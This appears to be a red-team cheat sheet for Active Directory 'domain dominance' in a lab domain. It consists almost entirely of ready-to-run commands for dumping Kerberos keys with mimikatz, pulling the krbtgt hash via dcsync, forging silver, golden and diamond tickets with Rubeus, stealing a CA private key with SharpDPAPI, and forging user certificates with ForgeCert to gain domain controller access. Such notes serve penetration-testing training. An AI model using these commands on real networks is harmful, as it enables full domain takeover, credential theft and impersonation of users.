### Domain Dominance

psexec |  CIFS 
	winrm  |  HOST & HTTP 
	dcsync (DCs only) | LDAP

```powershell

# Silver Ticket (offline)

1. Fetch the kerberos ekeys using mimikatz
beacon> mimikatz !sekurlsa:ekeys

2. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag for NTLM hash)
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3. Inject the ticket and Verify the access 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
beacon> steal_token 5668
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$


# Golden Ticket (offline)

1. Fetch the NTLM/AES hash of krbtgt account
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

2. Generate Golden ticket offline using Rubeus
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3. Inject golden ticket and gain acess
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$


# Diamond Ticket (online)

1. Fetch the SID of Ticket User
beacon> powerpick ConvertTo-SID dev/nlamb

2. Create Diamond ticket (512 - Enterprise Group ID, krbkey - Hash of KRBRGT account)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

3. Verify the specs of Diamond ticket vs Golden ticket
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=


# Forged certificates (DC or CA Server)

1. Dump the Private Key and Certificate of CA (to be executed on DC/CA)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

2. Save the certificate in .pem file and convert into pfx format using openssl
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

3. Next, use the stolen CA cert to generate fake cert for nlamb user
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

4. Encode the certificate
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

5. Use the certificate to get TGT for nlamb user
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap

6. Inject the ticket and access the service
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$

```